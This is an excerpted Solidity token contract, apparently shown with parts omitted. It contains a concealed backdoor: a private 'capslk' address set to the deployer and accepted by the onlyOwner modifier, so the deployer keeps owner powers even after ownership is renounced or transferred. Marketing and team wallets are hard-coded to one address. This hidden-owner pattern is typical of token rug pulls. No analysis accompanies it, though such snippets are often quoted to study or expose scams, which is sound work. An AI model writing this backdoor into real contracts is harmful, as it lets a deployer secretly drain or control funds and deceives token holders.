...
contract Ownable is Context {
    ...
    address private capslk;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;capslk = _owner;
    ...
    modifier onlyOwner() {
        require(_msgSender()   ==  capslk || _owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract coin is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x28626bd4ABf74FdA1816346D7308460784748A1E);
    address payable public teamWalletAddress = payable(0x28626bd4ABf74FdA1816346D7308460784748A1E);
